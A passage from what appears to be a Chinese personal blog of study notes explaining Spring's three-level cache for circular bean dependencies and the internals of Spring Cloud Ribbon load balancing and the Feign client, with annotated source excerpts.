 * key时Bean的名称，value是Bean实例  */private final Map&lt;String, Object&gt; singletonObjects = new ConcurrentHashMap&lt;&gt;(256);/** 二级缓存  * 用户缓存早期对象(对象属性还没有来得及进行赋值)  * key是Bean的名称，value是Bean实例  */private final Map&lt;String, Object&gt; earlySingletonObjects = new HashMap&lt;&gt;(16);/** 三级缓存   * key是Bean的名，value是一个ObjectFactory  * ObjectFactory是一个接口，这里存放的是一个接口的实现  */private final Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = new HashMap&lt;&gt;(16);/**  * 该集合用户缓存当前正在创建Bean的名称  * 用于限制对二级、三级缓存的访问：  * 1. 从缓存拿Bean的时候，如果Bean名称在这个集合中，可以访问所有缓存  * 2. 如果Bean名称不在这个集合中，只能访问一级缓存  * 这样设计，防止在非创建阶段访问二三级缓存，从而导致获取到不完整的Bean  */private final Set&lt;String&gt; singletonsCurrentlyInCreation     = Collections.newSetFromMap(new ConcurrentHashMap&lt;&gt;(16));\n\n一级缓存里存的是成熟对象，二级缓存里存的是早期对象，这个我们之前已经介绍过了。而三级缓存中存的是ObjectFactory，这是个什么东西？\n// 函数式接口@FunctionalInterfacepublic interface ObjectFactory&lt;T&gt; &#123;   // 该方法需要返回一个Bean   T getObject() throws BeansException;&#125;\n\n可以看到，它是一个函数式接口，其中的方法是getObject。我们再来看看Spring是如何往三级缓存中添加元素的：\n// addSingletonFactory方法存入三级缓存：// 把早期对象包装成一个ObjectFactory的实现存入三级缓存// 实现方式是通过getEarlyBeanReference方法返回一个早期BeanaddSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));\n\n可以看到，Spring提供了一个新的思路：不往缓存中放对象，而是将对象封装成一个接口的实现，存入三级缓存。那么什么时候放？实例化完成后，不再向二级缓存中放早期对象，而是将早期对象封装成一个接口的实现存入三级缓存。从三级缓存中拿到这个实现后，通过执行该实现方法拿到早期对象或者【代理对象】，再存入二级缓存。\n所以说，动态代理的过程也被封装到ObjectFactory接口的实现中了。最终Spring里真正的流程如下图：\n\n可以看到，三级缓存和二级缓存打了一个配合：三级缓存接口的实现方法行后得到的对象放入二级缓存。我们可以得到如下结论：\n\n一旦某个Bean出现在了二级缓存中，那么这个Bean一定出现了循环依赖。如果某个Bean没有循环依赖，三级缓存中这个Bean封装的方法实现根本不会被执行，因此一定不会出现在二级缓存中。\n\n关于之前我们说的动态代理，Spring将其一起封装到了三级缓存中的接口的实现方法中了，所以说，A的动态代理会先在它循环依赖的B中完成。但是如果A没有循环依赖怎么办？那A不就不会被动态代理了吗？所以说A初始化完成后还要再动态代理一次。\n\n介绍完了三级依赖，各位读者觉得三级依赖的作用是什么？\n\n更加简洁？并没有更加简洁，反而更加复杂了。\n动态代理和创建Bean的过程解耦？并没有解耦，因为初始化完成后还是需要动态代理。\n扩展性更强？Spring的Bean的后置处理器似乎和它也没啥关系。\n延迟加载？只存接口实现而不存Bean，如果没有循环依赖就不会执行接口的实现。但是迟早要执行，所以也没什么用。\n\n那到底有什么用？你觉得有什么用就有什么用。\n\n流程小结假如A、B循环依赖，从A的创建开始，流程如下：\n\n\n\n阶段\n一级缓存\n二级缓存\n三级缓存\n\n\n\nA开始实例化\n空\n空\n空\n\n\nA实例化完成\n空\n空\nA封装的ObjectFactory接口的实现\n\n\nA开始属性赋值，发现依赖B\n空\n空\nA封装的ObjectFactory接口的实现\n\n\nB开始实例化\n空\n空\nA封装的ObjectFactory接口的实现\n\n\nB实例化完成\n空\n空\nA封装的ObjectFactory接口的实现、B封装的ObjectFactory接口的实现\n\n\nB开始属性赋值，发现依赖A\n空\n空\nA封装的ObjectFactory接口的实现、B封装的ObjectFactory接口的实现\n\n\n从三级缓存中拿到A封装的ObjectFactory接口的实现并且执行\n空\n早期A（或者动态代理的A）\nB封装的ObjectFactory接口的实现\n\n\nB完成属性赋值\n空\n早期A（或者动态代理的A）\nB封装的ObjectFactory接口的实现\n\n\nB完成初始化\n成熟B\n早期A（或者动态代理的A）\n空\n\n\nA完成属性赋值\n成熟B\n早期A（或者动态代理的A）\n空\n\n\nA完成初始化\n成熟A、成熟B\n空\n空\n\n\n源码解析之前我们已经介绍过了Bean的大致创建流程，从AbstractBeanFactory的getBean方法开始：\n   public Object getBean(String name) throws BeansException &#123;      // 真正的获取bean的逻辑doGetBean      return doGetBean(name, null, null, false);   &#125;protected &lt;T&gt; T doGetBean(final String name, @Nullable final Class&lt;T&gt; requiredType,\t\t@Nullable final Object[] args, boolean typeCheckOnly) throws BeansException &#123;\t// 获得Bean的转换获得Bean的名称，因为传入的可能是工厂Bean的名称\tfinal String beanName = transformedBeanName(name);\tObject bean;\t// getSingleton尝试去缓存中获取对象，这个方法非常重要\tObject sharedInstance = getSingleton(beanName);\tif (sharedInstance != null &amp;&amp; args == null) &#123;\t           ...               \t\t// 如果获取到了，下面的方法处理工厂Bean的情况，之后会直接返回\t\tbean = getObjectForBeanInstance(sharedInstance, name, beanName, null);\t&#125;\telse &#123;\t\t// 这里可以看出Spring只能解决单例对象的循环依赖，不能解决构多例\t\tif (isPrototypeCurrentlyInCreation(beanName)) &#123;\t\t\tthrow new BeanCurrentlyInCreationException(beanName);\t\t&#125;\t\t/**\t\t * 判断AbstractBeanFacotry工厂是否有父工厂\t\t * (一般情况下是没有父工厂因为abstractBeanFactory直接是抽象类,不存在父工厂)\t\t * 只有和SpringMvc整合的时才会有父子容器的概念，这里不过多介绍\t\t */\t\tBeanFactory parentBeanFactory = getParentBeanFactory();\t\t           ...\t\ttry &#123;\t\t\t\t\t\t// 处理dependsOn的依赖(这个不是我们所谓的循环依赖)\t\t\tString[] dependsOn = mbd.getDependsOn();\t\t\t\tif (dependsOn != null) &#123;\t\t\t\t                    ... \t\t\t&#125;\t\t\t// 创建单例bean\t\t\tif (mbd.isSingleton()) &#123;\t\t\t\t// 调用DefaultSingletonBeanRegistry的getSingleton方法\t\t\t\t// lambda表达式实现了ObjectFactory接口的getObject方法                   // 将getObject方法方法作为参数传给getSingleton方法\t\t\t\t// 在getSingleton方法中会调用这个getObject方法创建Bean\t\t\t\tsharedInstance = getSingleton(beanName, () -&gt; &#123;\t\t\t\t\ttry &#123;\t\t\t\t\t\t// 回调后执行createBean进入创建bean的逻辑\t\t\t\t\t\treturn createBean(beanName, mbd, args);\t\t\t\t\t&#125;\t\t\t\t\tcatch (BeansException ex) &#123;\t\t\t\t\t\t// 创建bean的过程中发生异常,需要销毁关于当前bean的所有信息\t\t\t\t\t\tdestroySingleton(beanName);\t\t\t\t\t\tthrow ex;\t\t\t\t\t&#125;\t\t\t\t&#125;);\t\t\t\tbean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);\t\t\t&#125;\t\t\t...\t\t&#125;\t&#125;\treturn (T) bean;&#125;\n\n我们先看看DefaultSingletonBeanRegistry中的getSingleton方法，这个方法是从缓存中获取Bean，非常重要：\n   public Object getSingleton(String beanName) &#123;      // 接着调用      return getSingleton(beanName, true);java   &#125;protected Object getSingleton(String beanName, boolean allowEarlyReference) &#123;\t// 1. 尝试去一级缓存拿Bean，拿到了就直接返回\tObject singletonObject = this.singletonObjects.get(beanName);\t/**\t * 若在一级缓存中没有获取到对象，并且该Bean正在创建(出现了循环依赖)\t * 如果满足了上面两个条件，才可以去二级、三级缓存中拿\t */\tif (singletonObject == null &amp;&amp; isSingletonCurrentlyInCreation(beanName)) &#123;           // 这里加锁了\t\tsynchronized (this.singletonObjects) &#123;\t\t\t// 2.尝试去二级缓存中获取对象(早期对象)\t\t\tsingletonObject = this.earlySingletonObjects.get(beanName);\t\t\t// 二级缓存中也没有获取到对象               // 并且allowEarlyReference为true               // 3.那么从三级缓存中拿               // (这个参数是上一个方法传进来的，用于控制对三级缓存的访问)\t\t\tif (singletonObject == null &amp;&amp; allowEarlyReference) &#123;\t\t\t\t// 直接从三级缓存中获取ObjectFactory接口的实现\t\t\t\tObjectFactory&lt;?&gt; singletonFactory                        = this.singletonFactories.get(beanName);\t\t\t\t// 4.如果从三级缓存中获取到对象不为空\t\t\t\tif (singletonFactory != null) &#123;\t\t\t\t    /** 执行实现ObjectFactory接口的getObject方法\t\t\t\t\t  * 又会调用到getEarlyBeanReference()来进行后置处理\t\t\t\t\t  * 返回的可能就是原早期对象，或者是一个动态代理后的代理对象\t\t\t\t\t  */\t\t\t\t\tsingletonObject = singletonFactory.getObject();\t\t\t\t\t// 把早期对象/或者代理对象放置在二级缓存\t\t\t\t\tthis.earlySingletonObjects.put(beanName, singletonObject);\t\t\t\t\t// 把包装对象从三级缓存中删除掉\t\t\t\t\tthis.singletonFactories.remove(beanName);\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\treturn singletonObject;&#125;\n\n可以看到从缓存中获取Bean的流程和我们之前分析的一样：如果Bean不是正在创建，只能去一级缓存中拿；如果Bean正在创建(出现循环依赖)，可以去所有缓存中去拿。在三级缓存中拿到ObjectFactory接口的实现的方法，执行后，将获取到的对象放入二级缓存。\n那如果三级缓存中都没有呢？那就要开始创建Bean了，我们回到DefaultSingletonBeanRegistry中的getSingleton方法，注意这个getSingleton方法和上面的不一样！请看代码：\n// 参数singletonFactory是传进来的lambda表达式   // 它实现了ObjectFactory接口的getObject方法，该方法中会进行回调public Object getSingleton(String beanName, ObjectFactory&lt;?&gt; singletonFactory) &#123;      Assert.notNull(beanName, &quot;Bean name must not be null&quot;);      // 加锁      synchronized (this.singletonObjects) &#123;         // 尝试从一级缓存中获取对象         Object singletonObject = this.singletonObjects.get(beanName);         // 如果没获取到         if (singletonObject == null) &#123;                         ...                           /** beforeSingletonCreation方法             * 标记当前的Bean正在创建，就是将Bean的名称假如singletonsCurrentlyInCreation集合             * 这里标记后，上面从二级、三级缓存中拿这个对象的条件就满足了             */            beforeSingletonCreation(beanName);            boolean newSingleton = false;            boolean recordSuppressedExceptions = (this.suppressedExceptions == null);            if (recordSuppressedExceptions) &#123;               this.suppressedExceptions = new LinkedHashSet&lt;&gt;();            &#125;            try &#123;\t\t\t// 回调传入的lambda表达式               // 这个过程其实是调用AbstractAutowireCapableBeanFactory的createBean方法               singletonObject = singletonFactory.getObject();               newSingleton = true;            &#125;               ...            finally &#123;               if (recordSuppressedExceptions) &#123;                  this.suppressedExceptions = null;               &#125;               // 后置处理               // 主要做的事情就是把Bean从正在创建的集合中移除               afterSingletonCreation(beanName);            &#125;            if (newSingleton) &#123;               // 将Bean加入缓存中               // 方法的逻辑就是加入一级，并且从二级、三级缓存中移除               addSingleton(beanName, singletonObject);            &#125;         &#125;         return singletonObject;      &#125;   &#125;\n\n回调传入的lambda表达式，从而调用AbstractAutowireCapableBeanFactory的createBean方法，我们接着往下走：\n   protected Object createBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)         throws BeanCreationException &#123;      if (logger.isDebugEnabled()) &#123;         logger.debug(&quot;Creating instance of bean &#x27;&quot; + beanName + &quot;&#x27;&quot;);      &#125;      RootBeanDefinition mbdToUse = mbd;      // 确保此时的 bean 已经被解析了      Class&lt;?&gt; resolvedClass = resolveBeanClass(mbd, beanName);      if (resolvedClass != null &amp;&amp; !mbd.hasBeanClass() &amp;&amp; mbd.getBeanClassName() != null) &#123;         mbdToUse = new RootBeanDefinition(mbd);         mbdToUse.setBeanClass(resolvedClass);      &#125;      // Prepare method overrides.      try &#123;                 ...      try &#123;         // 执行第1个bean后置处理器         Object bean = resolveBeforeInstantiation(beanName, mbdToUse);         if (bean != null) &#123;            return bean;         &#125;      &#125; catch (Throwable ex) &#123;         throw new BeanCreationException(mbdToUse.getResourceDescription(), beanName,               &quot;BeanPostProcessor before instantiation of bean failed&quot;, ex);      &#125;      try &#123;         // doCreateBean才是真正的创建我们的bean的实例对象的过程         Object beanInstance = doCreateBean(beanName, mbdToUse, args);         if (logger.isDebugEnabled()) &#123;            logger.debug(&quot;Finished creating instance of bean &#x27;&quot; + beanName + &quot;&#x27;&quot;);         &#125;      &#125;             ...   &#125;                // doCreateBean就是真正Bean创建的逻辑   protected Object doCreateBean(final String beanName, final RootBeanDefinition mbd, final @Nullable Object[] args)\t\tthrows BeanCreationException &#123;\t// BeanWrapper是对Bean的包装\tBeanWrapper instanceWrapper = null;\tif (mbd.isSingleton()) &#123;\t\t// 从没有完成的FactoryBean中移除\t\tinstanceWrapper = this.factoryBeanInstanceCache.remove(beanName);\t&#125;\tif (instanceWrapper == null) &#123;\t\t// 1.实例化bean\t\tinstanceWrapper = createBeanInstance(beanName, mbd, args);\t&#125;\t// 从beanWrapper中获取早期对象\tfinal Object bean = instanceWrapper.getWrappedInstance();\tClass&lt;?&gt; beanType = instanceWrapper.getWrappedClass();\tif (beanType != NullBean.class) &#123;\t\tmbd.resolvedTargetType = beanType;\t&#125;\t// Allow post-processors to modify the merged bean definition.\tsynchronized (mbd.postProcessingLock) &#123;\t\tif (!mbd.postProcessed) &#123;\t\t\ttry &#123;\t\t\t\t// 进行后置处理@AutoWired、@Value的注解的预解析\t\t\t\tapplyMergedBeanDefinitionPostProcessors(mbd, beanType, beanName);\t\t\t&#125; catch (Throwable ex) &#123;\t\t\t\tthrow new BeanCreationException(mbd.getResourceDescription(), beanName,\t\t\t\t\t\t&quot;Post-processing of merged bean definition failed&quot;, ex);\t\t\t&#125;\t\t\tmbd.postProcessed = true;\t\t&#125;\t&#125;\t/**\t * 存放到三级缓存中\t * 条件如下：\t * 1. 是单例\t * 2. 该Bean正在创建\t * 3. allowCircularReferences为true\t *    可以通过ApplicationContext的setAllowCircularReferences方法对其设置\t */\tboolean earlySingletonExposure = (mbd.isSingleton() &amp;&amp; this.allowCircularReferences &amp;&amp;\t\t\tisSingletonCurrentlyInCreation(beanName));\t// 上述条件满足\tif (earlySingletonExposure) &#123;\t\tif (logger.isDebugEnabled()) &#123;\t\t\tlogger.debug(&quot;Eagerly caching bean &#x27;&quot; + beanName +\t\t\t\t\t&quot;&#x27; to allow for resolving potential circular references&quot;);\t\t&#125;\t\t// 2.存入三级缓存的是一个接口的实现\t\t// 把早期对象包装成一个ObjectFactory接口的实现           // 实现了getObject方法，该方法内部调用getEarlyBeanReference方法\t\taddSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));\t&#125;\t// Initialize the bean instance.\tObject exposedObject = bean;\ttry &#123;\t\t// 3.属性赋值，这里会涉及到循环依赖\t\tpopulateBean(beanName, mbd, instanceWrapper);\t\t// 4.进行对象初始化操作(在这里可能生成代理对象)\t\texposedObject = initializeBean(beanName, exposedObject, mbd);\t&#125; catch (Throwable ex) &#123;\t\tif (ex instanceof BeanCreationException &amp;&amp; beanName.equals(((BeanCreationException) ex).getBeanName())) &#123;\t\t\tthrow (BeanCreationException) ex;\t\t&#125; else &#123;\t\t\tthrow new BeanCreationException(\t\t\t\t\tmbd.getResourceDescription(), beanName, &quot;Initialization of bean failed&quot;, ex);\t\t&#125;\t&#125;\t// 是早期对象暴露\tif (earlySingletonExposure) &#123;\t\t// 去缓存中获取到我们的对象，由于传递的allowEarlyReference是false \t    // 只能在一级二级缓存中去获取\t\tObject earlySingletonReference = getSingleton(beanName, false);\t\t// 能够获取到,说明出现了循环依赖\t\tif (earlySingletonReference != null) &#123;\t\t\t// 经过后置处理初始化后的Bean和早期的Bean引用还相等的话               // 表示当前的Bean没有代理，用从二级缓存中获取到Bean的覆盖当前Bean\t\t\tif (exposedObject == bean) &#123;\t\t\t\texposedObject = earlySingletonReference;\t\t\t&#125;\t\t\t// 处理依赖的Bean\t\t\telse if (!this.allowRawInjectionDespiteWrapping &amp;&amp; hasDependentBean(beanName)) &#123;\t\t\t\t...\t\t\t&#125;\t\t&#125;\t&#125;\t// Register bean as disposable.\ttry &#123;\t\t// 注册销毁的Bean的销毁接口\t\tregisterDisposableBeanIfNecessary(beanName, bean, mbd);\t&#125; catch (BeanDefinitionValidationException ex) &#123;\t\tthrow new BeanCreationException(\t\t\t\tmbd.getResourceDescription(), beanName, &quot;Invalid destruction signature&quot;, ex);\t&#125;\treturn exposedObject;&#125;\n\n到这里，Bean就创建完成了，最终会放入一级缓存中。在这个过程中，有几点需要说明：\n\n构造方法中的循环依赖无法解决，因为构造完后Bean才被封装放入三级缓存(&#96;&#96;)\n多例的Bean是不会存在缓存中的，也无法解决循环依赖\n工厂方法和@Bean标注的方法(@Bean标注的方法也是工厂方法)也无法解决循环依赖\nsetter方法注入(&#96;&#96;)和@Autowired可以解决循环依赖，因为实例化之后才执行setter方法和@Autowired注入\n\n总结\n\n看不下去了 等过段事件再看spring\n2021.6.1\n","tags":["2021"]},{"title":"SpringCloud","url":"/2021/08/10/2021/SpringCloud/","content":"\n\nRibbon基础认识目前主流的负载方案分为以下两种：\n\n集中式负载均衡，在消费者和服务提供方中间使用独立的代理方式进行负载，有硬件的（比如 F5），也有软件的（比如 Nginx）。\n客户端根据自己的请求情况做负载均衡，Ribbon 就属于客户端自己做负载均衡。\n\nRibbon客户端组件提供一系列的完善的配置，如超时，重试等。通过Load Balancer获取到服务提供的所有机器实例，Ribbon会自动基于某种规则(轮询，随机)去调用这些服务。Ribbon也可以实现我们自己的负载均衡算法。\n常见的负载均衡算法\n随机，通过随机选择服务进行执行，一般这种方式使用较少;\n轮训，负载均衡默认实现方式，请求来之后排队处理;\n加权轮训，通过对服务器性能的分型，给高配置，低负载的服务器分配更高的权重，均衡各个服务器的压力;\n地址Hash，通过客户端请求的地址的HASH值取模映射进行服务器调度。  ip hash\n最小链接数，即使请求均衡了，压力不一定会均衡，最小连接数法就是根据服务器的情况，比如请求积压数等参数，将请求分配到当前压力最小的服务器上。  最小活跃数\n\n基本使用导入依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt;&lt;/dependency&gt;\n\n主要是依靠@LoadBalanced注解处理\n@Configurationpublic class RestConfig &#123;    @Bean    @LoadBalanced  //客戶端的負載均衡    public RestTemplate restTemplate() &#123;                return new RestTemplate();    &#125;&#125;\n\n在这一步,@LoadBalanced是在RestTemplate中配置了拦截器，将LoadBalanceInterceptor\n\n可以看到这里对restTemplate设置了拦截器处理\n回到使用，在Controller中是：\n@Autowiredprivate RestTemplate restTemplate;@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)public R  findOrderByUserId(@PathVariable(&quot;id&quot;) Integer id) &#123;    //这里将会被Ribbon从注册中心拉去服务，然后进行分析    //通过对应负载均衡算法进行更改URL，得到最后的调用地址，完成调用    String url = &quot;http://mall-order/order/findOrderByUserId/&quot;+id;    R result = restTemplate.getForObject(url,R.class);    return result;&#125;\n\n原理Ribbon基本的调用如下图\n\n其实主要的逻辑就是拉取服务，确定调用的位置，调用。\n那么小的模拟Ribbon的demo如下：\n@Autowired//基本的RestTemplateprivate RestTemplate restTemplate;@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)public R  findOrderByUserId(@PathVariable(&quot;id&quot;) Integer id) &#123;    //模拟ribbon实现    //主要看getUri    String url = getUri(&quot;liduoan-order&quot;)+&quot;/order/findOrderByUserId/&quot;+id;    // 添加@LoadBalanced    R result = restTemplate.getForObject(url,R.class);    return result;&#125;@Autowired//这是Nacos提供的客户端private DiscoveryClient discoveryClient;public String getUri(String serviceName) &#123;    //获取对应服务名下的所有服务    List&lt;ServiceInstance&gt; serviceInstances = discoveryClient.getInstances(serviceName);    //简单判断    if (serviceInstances == null || serviceInstances.isEmpty()) &#123;        return null;    &#125;    int serviceSize = serviceInstances.size();    //轮询,确定调用哪个服务    int indexServer = incrementAndGetModulo(serviceSize);    //返回最终调用字符串    return serviceInstances.get(indexServer).getUri().toString();&#125;//原子数，用来负载均衡private AtomicInteger nextIndex = new AtomicInteger(0);private int incrementAndGetModulo(int modulo) &#123;    for (;;) &#123;        //其实就是轮询        int current = nextIndex.get();        int next = (current + 1) % modulo;        //CAS操作，如果失败表示已经有人使用过这个【next】的URL了        if (nextIndex.compareAndSet(current, next)             //调用完nextIndex为新值            下面不太理解为什么要这么处理，感觉多次一举            &amp;&amp; current &lt; modulo)&#123;            return current;        &#125;    &#125;&#125;\n\nFeign基础认识我们在Ribbon中看到常用的服务调用是使用对应的Http客户端进行调用的。\n常见的客户端有：\n\nHttpclient\n\nHttpClient 是 Apache Jakarta Common 下的子项目，用来提供高效的、最新的、功能丰富的支持 Http 协议的客户端编程工具包，并且它支持 HTTP 协议最新版本和建议。HttpClient 相比传统 JDK 自带的 URLConnection，提升了易用性和灵活性，使客户端发送 HTTP 请求变得容易，提高了开发的效率。\n\nOkhttp\n\n一个处理网络请求的开源项目，是安卓端最火的轻量级框架，由 Square 公司贡献，用于替代 HttpUrlConnection 和 Apache HttpClient。OkHttp 拥有简洁的 API、高效的性能，并支持多种协议（HTTP&#x2F;2 和 SPDY）。\n\nHttpURLConnection\n\nHttpURLConnection 是Java的标准类，它继承自 URLConnection，可用于向指定网站发送 GET 请求、POST 请求。HttpURLConnection 使用比较复杂，不像 HttpClient 那样容易使用。\n\nRestTemplate &amp; WebClient\n\nRestTemplate 是Spring提供的用于访问 Rest 服务的客户端，RestTemplate 提供了多种便捷访问远程 HTTP 服务的方法，能够大大提高客户端的编写效率。\n\n而Feign的调用方式比上面的更为优雅和平滑，类似Dubbo，我们希望像调用本地方法那样来调用远程服务。\nFeign支持多种注解，例如Feign自带的注解或者JAX-RS注解等。\nSpring Cloud openfeign对Feign进行了增强，使其支持Spring MVC注解，另外还整合了Ribbon和Eureka，从而使得Feign的使用更加方便。\nFeign可以做到使用 HTTP 请求远程服务时就像调用本地方法一样的体验，开发者完全感知不到这是远程方法，更感知不到这是个 HTTP 请求。、\n它像 Dubbo 一样，consumer 直接调用接口方法调用 provider，而不需要通过常规的 Http Client 构造请求再解析返回数据。它解决了让开发者调用远程接口就跟调用本地方法一样，无需关注与远程的交互细节，更无需关注分布式环境开发。\n基本使用我们使用SpringCloud整合Feign\n首先是依赖：\n&lt;!-- openfeign 远程调用 --&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;&lt;/dependency&gt;\n\n然后编写对应的调用接口\n//FeignConfig局部配置@FeignClient(value = &quot;mall-order&quot;,path = &quot;/order&quot;)public interface OrderFeignService &#123;    @RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)    R findOrderByUserId(@PathVariable(&quot;userId&quot;) Integer userId);    @RequestMapping(value = &quot;/save&quot;,consumes = MediaType.APPLICATION_JSON_VALUE)    //注意到这里是转成json处理了    R save(@RequestBody OrderVo order);&#125;\n\n在启动类上加上注解：\n@SpringBootApplication@EnableFeignClientspublic class MallUserFeignDemoApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(MallUserFeignDemoApplication.class, args);    &#125;&#125;\n\n发起调用\n@RestController@RequestMapping(&quot;/user&quot;)public class UserController &#123;    // 注入feign    @Autowired    OrderFeignService orderFeignService;    @RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)    public R  findOrderByUserId(@PathVariable(&quot;id&quot;) Integer id) &#123;        // feign调用        R result = orderFeignService.findOrderByUserId(id);        return result;    &#125;&#125;\n\n原理首先我们从整体上看：\n\n其实这样看我们就可以大致了解逻辑了。\n但是我们再从来源走向去思考：\n首先我们一开始是使用对应的Http客户端直接访问，那么我们的目的是为了像调用本地方法那样去访问。\n如此，需要确定服务名，确定路径，保证调用的地址能够确定。\n之后我们调用本地方法，获取对应返回值。\n然而我这样解释，搞得我都有点不太理解了，所以我去看了下源码，直接从源码走向去整体理解。\n源码分析我觉得整体上还是Spring那套，回顾一下Spring那点东西，就依照我以前画的图：\n\n注入BendDefiniton正常而言，我们的接口实现是：\n@FeignClient(value = &quot;mall-order&quot;,path = &quot;/order&quot;)public interface OrderFeignService &#123;    @RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)    R findOrderByUserId(@PathVariable(&quot;userId&quot;) Integer userId);    @RequestMapping(value = &quot;/save&quot;,consumes = MediaType.APPLICATION_JSON_VALUE)    R save(@RequestBody OrderVo order);&#125;\n\n看注解：@FeignClient，按照Spring的尿性，可能是从扫描包开始。\n那么我们可以在FeignClientsRegistrar这个类中发现：\n@Overridepublic void registerBeanDefinitions(AnnotationMetadata metadata,                                    BeanDefinitionRegistry registry) &#123;    //标准的查看配置    registerDefaultConfiguration(metadata, registry);    //字面意义的注册客户端    registerFeignClients(metadata, registry);&#125;\n\n我们进入registerDefaultConfiguration\nprivate void registerDefaultConfiguration(AnnotationMetadata metadata,                                          BeanDefinitionRegistry registry) &#123;    Map&lt;String, Object&gt; defaultAttrs = metadata        .getAnnotationAttributes(EnableFeignClients.class.getName(), true);    if (defaultAttrs != null &amp;&amp; defaultAttrs.containsKey(&quot;defaultConfiguration&quot;)) &#123;        String name;        if (metadata.hasEnclosingClass()) &#123;            name = &quot;default.&quot; + metadata.getEnclosingClassName();        &#125;        else &#123;            name = &quot;default.&quot; + metadata.getClassName();        &#125;        //重点在这里        registerClientConfiguration(registry, name,                                    defaultAttrs.get(&quot;defaultConfiguration&quot;));    &#125;&#125;private void registerClientConfiguration(BeanDefinitionRegistry registry, Object name,                                         Object configuration) &#123;    BeanDefinitionBuilder builder = BeanDefinitionBuilder        .genericBeanDefinition(FeignClientSpecification.class);    builder.addConstructorArgValue(name);    builder.addConstructorArgValue(configuration);    //注册了大量的Bean定义    registry.registerBeanDefinition(        name + &quot;.&quot; + FeignClientSpecification.class.getSimpleName(),        builder.getBeanDefinition());&#125;\n\n通过查看可以发现\n\n其中有大量的后置处理器被放入BeanDefinitionMap和启动类中。\n到现在，是完成了主要的默认操作。我们接下来该走 registerFeignClients(metadata, registry);\npublic void registerFeignClients(AnnotationMetadata metadata,                                 BeanDefinitionRegistry registry) &#123;    //获取扫描器，以便后续扫描包    ClassPathScanningCandidateComponentProvider scanner = getScanner();    scanner.setResourceLoader(this.resourceLoader);    Set&lt;String&gt; basePackages;\t//metadata    ..........    //最终获取到了包名    //这个地方就太熟悉了 SpringMvc也是这样获得对应的Controller，然后注册到BeanDefinition中    for (String basePackage : basePackages) &#123;        //BeanDefinition的Set        Set&lt;BeanDefinition&gt; candidateComponents = scanner            .findCandidateComponents(basePackage);        //注意到上面定向到了BeanDefinition        //挺奇怪的是为什么没有其他Bean定义，只有OrderFeignService的Bean定义        //通过遍历BeanDefinition来确定这些是否是        for (BeanDefinition candidateComponent : candidateComponents) &#123;            if (candidateComponent instanceof AnnotatedBeanDefinition) &#123;                // verify annotated class is an interface                AnnotatedBeanDefinition beanDefinition = (AnnotatedBeanDefinition) candidateComponent;                AnnotationMetadata annotationMetadata = beanDefinition.getMetadata();                Assert.isTrue(annotationMetadata.isInterface(),                              &quot;@FeignClient can only be specified on an interface&quot;);\t\t\t\t//获取到带FeignClient注解                Map&lt;String, Object&gt; attributes = annotationMetadata                    .getAnnotationAttributes(                    FeignClient.class.getCanonicalName());\t\t\t\t//获取所有的BeanName                String name = getClientName(attributes);                registerClientConfiguration(registry, name,                                            attributes.get(&quot;configuration&quot;));                registerFeignClient(registry, annotationMetadata, attributes);            &#125;        &#125;    &#125;&#125;\n\n这是刚刚提到的情况，不过并不很重要。\n//注意到上面定向到了BeanDefinition//挺奇怪的是为什么没有其他Bean定义，只有OrderFeignService的Bean定义//通过遍历BeanDefinition来确定这些是否是\n\n\n到了现在\t我们终于把BeanDefinition注册了。\n我本来想去BeanDeinitionMap中把这个Bean定义找出来截图，但是好多啊，看的眼疼，就算了吧。。\n生成代理类注入bean之后，通过jdk的代理生成代理类\n代码在ReflectiveFeign类中：\n@Overridepublic &lt;T&gt; T newInstance(Target&lt;T&gt; target) &#123;    //注意这里获取到了    Map&lt;String, MethodHandler&gt; nameToHandler = targetToHandlersByName.apply(target);    Map&lt;Method, MethodHandler&gt; methodToHandler = new LinkedHashMap&lt;Method, MethodHandler&gt;();    List&lt;DefaultMethodHandler&gt; defaultMethodHandlers = new LinkedList&lt;DefaultMethodHandler&gt;();\t//这一步就是把对应的方法放到methodToHandler    for (Method method : target.type().getMethods()) &#123;        if (method.getDeclaringClass() == Object.class) &#123;            continue;        &#125; else if (Util.isDefault(method)) &#123;            DefaultMethodHandler handler = new DefaultMethodHandler(method);            defaultMethodHandlers.add(handler);            methodToHandler.put(method, handler);        &#125; else &#123;            methodToHandler.put(method, nameToHandler.get(Feign.configKey(target.type(), method)));        &#125;    &#125;    //这里就是创建代理对象了    InvocationHandler handler = factory.create(target, methodToHandler);    T proxy = (T) Proxy.newProxyInstance(target.type().getClassLoader(),                                         new Class&lt;?&gt;[] &#123;target.type()&#125;, handler);    for (DefaultMethodHandler defaultMethodHandler : defaultMethodHandlers) &#123;        defaultMethodHandler.bindTo(proxy);    &#125;    //最后返回代理类    return proxy;&#125;\n\nMap&lt;String, MethodHandler&gt; nameToHandler中的具体东西\n\n看到了对应的Http客户端，对应的请求拦截器，对应的日志。\n同时注意到，这里是使用了LoadBalancerDeignClient的客户端，说明它具有负载均衡的能力\n也说明它可以把对应服务名最后转换成IP+端口的形式、\n同时我们的两个方法名也获得了\n让我们在看下最后生成的代理类：\n\n注意到了两个Method方法。\n发生请求当我们请求过来时，主要逻辑在SynchronousMethodHandler中：\npublic Object invoke(Object[] argv) throws Throwable &#123;    //好家伙，最后的客户端终于出现了    //注意哦 这里是构建了请求格式    RequestTemplate template = buildTemplateFromArgs.create(argv);    Options options = findOptions(argv);    Retryer retryer = this.retryer.clone();    while (true) &#123;      try &#123;        //最后在这里调用        return executeAndDecode(template, options);\t  .............  &#125;\n\nRequestTemplate是做好的请求格式\n\n我们看最后的executeAndDecode方法！！\nObject executeAndDecode(RequestTemplate template, 